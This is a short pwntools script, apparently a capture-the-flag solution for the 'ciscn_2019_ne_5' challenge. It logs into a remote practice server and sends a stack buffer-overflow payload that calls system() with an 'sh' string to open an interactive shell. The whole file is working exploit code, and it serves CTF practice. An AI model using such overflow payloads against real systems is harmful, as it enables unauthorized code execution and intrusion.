#coding:utf-8
from pwn import *
import pwnlib
# sh = process("./ciscn_2019_ne_5")
sh =remote('node3.buuoj.cn',29838)
elf = ELF("./ciscn_2019_ne_5")
sys_addr = elf.symbols['system']
log.info("syccess get system_addr:0x%x" %sys_addr)
sh_addr = 0x080482ea
payload = 'a' *0x4c + p32(sys_addr) + p32(sys_addr) * 2 + p32(sh_addr)
sh.sendlineafter("password:","administrator")
sh.sendlineafter("0.Exit\n:","1")
sh.sendlineafter("info:",payload)
sh.sendlineafter("0.Exit\n:","4")
sh.interactive()